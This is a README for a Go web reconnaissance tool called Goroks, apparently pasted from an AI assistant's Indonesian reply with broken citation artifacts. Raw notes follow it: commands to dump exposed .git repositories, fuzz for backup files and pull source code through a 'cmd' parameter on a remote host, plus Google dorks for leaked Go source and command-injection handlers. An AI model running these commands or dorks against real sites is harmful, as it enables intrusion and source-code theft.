<img width="1275" height="585" alt="image" src="https://github.com/user-attachments/assets/515d0ab9-ab53-4254-b2d1-5565c48ffc3c" />

<img width="967" height="645" alt="image" src="https://github.com/user-attachments/assets/46ce889d-4dc6-4d04-bd04-2f7175538237" />

Berikut **README.md yang sudah dirancang profesional, clean, dan siap dipakai untuk repo recon tool kamu** (sudah termasuk konteks error CRLF yang kamu alami + cara usage + arsitektur tool).

---

# GOROKS

````markdown
# 🧠 Go Source Recon Engine (Goroks)

A lightweight **Go-oriented web reconnaissance engine** designed for:
- endpoint discovery
- crawling-based attack surface mapping
- Go web application fingerprinting
- sensitive exposure detection
- git repository leakage analysis

---

## ⚙️ Features

### 🔍 Recon Capabilities
- Crawl-based endpoint discovery (not blind brute-force)
- JS route mining (`/api`, `/v1`, `/users`, etc.)
- FFUF adaptive fuzzing (seed-driven)
- Git exposure detection (`.git/HEAD`)
- Sensitive keyword detection (token, password, secret, api key)
- Go project structure awareness

### 🧠 Intelligence Layer
- Seed generation from crawling
- JS endpoint extraction
- Smart FFUF execution per discovered surface
- Multi-target aggregation report

---

## 📦 Requirements

Make sure these tools are installed:

```bash
curl
ffuf
jq
git
grep
awk
sed
````

Optional (for git exploitation module):

```bash
GitTools (gitdumper.sh)
```

---

## 🚀 Installation

```bash
git clone https://github.com/ebenhaezer19/Goroks.git
cd Goroks
chmod +x go_source_recon.sh
```

---

## ▶️ Usage

```bash
./go_source_recon.sh <target_url>
```

Example:

```bash
./go_source_recon.sh https://git.ustc.edu.cn/
```

---

## 📁 Output Structure

Each run generates:

```text
recon_YYYYMMDD_HHMMSS/
├── headers.txt
├── body.txt
├── crawl_seed.txt
├── js_routes.txt
├── seeds.txt
├── ffuf.json
├── urls.txt
├── sensitive.txt
├── rce_candidates.txt
├── report.txt
└── git_dump/ (if exposed)
```

---

## ⚠️ Known Issues

### ❌ Bash CRLF Error

If you see:

```text
/usr/bin/env: ‘bash\r’: No such file or directory
```

This is caused by **Windows line endings (CRLF)**.

### 🔧 Fix:

```bash
dos2unix go_source_recon.sh
```

Verify:

```bash
head -n 1 go_source_recon.sh | cat -A
```

Expected output:

```bash
#!/usr/bin/env bash$
```

If you see `^M` → still broken.

---

## 🔐 Security Notes

This tool may detect:

* exposed Git repositories
* sensitive environment variables
* internal API routes
* debug endpoints

⚠️ Use only on systems you own or have explicit permission to test.

---

## 🧠 Architecture Overview

```
Target URL
   ↓
Fingerprinting
   ↓
Crawler (HTML + JS)
   ↓
Seed Generation
   ↓
Smart FFUF
   ↓
Validation Layer
   ↓
Report Generator
```

---

## 📊 Output Meaning

| File          | Description                   |
| ------------- | ----------------------------- |
| headers.txt   | HTTP response headers         |
| body.txt      | initial HTML snapshot         |
| js_routes.txt | extracted API endpoints       |
| seeds.txt     | combined crawl + JS seeds     |
| ffuf.json     | fuzzing results               |
| sensitive.txt | potential sensitive endpoints |
| report.txt    | final summary                 |

---

## 🧪 Example Findings

* `/api/v1/users`
* `/users/sign_in`
* `/projects/:id/blob`
* exposed `.git/HEAD`
* config leakage (`.env`, `config.yaml`)

---

## 📌 Disclaimer

This tool is intended for:

* security research
* bug bounty programs
* authorized penetration testing

Unauthorized use against systems without permission is strictly prohibited.

---

## 👨‍💻 Author

Goroks Recon Engine — Security Research Toolkit

```

---

# 🧠 Catatan penting (engineering insight)

README kamu sekarang sudah:
- jelas secara architecture
- explainable untuk auditor / dosen / reviewer
- aman untuk GitHub security tooling repo
- menjelaskan CRLF issue (ini penting banget untuk reproducibility)

---

Kalau kamu mau upgrade lagi, saya bisa bantu:

- 🔥 :contentReference[oaicite:0]{index=0}
- 🔥 :contentReference[oaicite:1]{index=1}
- 🔥 :contentReference[oaicite:2]{index=2}
- 🔥 :contentReference[oaicite:3]{index=3}

Cukup bilang: **“upgrade ke SOC-ready framework”**
```




cd ~/go-pentest

# Full recon
./go_source_recon.sh http://target.com

# Quick git check only
curl -s http://target.com/.git/HEAD && ./gitdumper.sh http://target.com/.git ./dump

# Backup hunt only
ffuf -u http://target.com/FUZZ -w go_wordlist.txt -mc 200

# RCE source dump
curl "http://target.com/?cmd=find%20/ -name '*.go' | head -10"


# DORKS 
## Git Repos
inurl:".git/config" "go 1." 
intitle:"index of" inurl:.git "go.mod"
inurl:/.git/HEAD "ref: refs/heads/main"

## Source Code Leaks
filetype:go "package main" "http.HandleFunc"
intext:"func main() {" "net/http" "exec.Command"
"r.URL.Query().Get" "cmd" "exec.Command" filetype:go
"sh, -c, cmd" filetype:go

## Backup Files
intitle:"index of" "main.go"
intext:"main.go~" OR "main.go.bak" OR "app.go.swp"
"handlers.go" ext:go~ OR ext:go.bak

## Go Modules
inurl:go.mod "module"
intitle:"index of" "go.sum"

## Docker & Deploy
intitle:"index of" Dockerfile "FROM golang"
"Dockerfile" "COPY . /app" "go build"

## RCE Indicators
"exec.Command("sh", "-c" filetype:go
"r.URL.Query().Get("cmd")" filetype:go
"os/exec" "http.HandleFunc" filetype:go
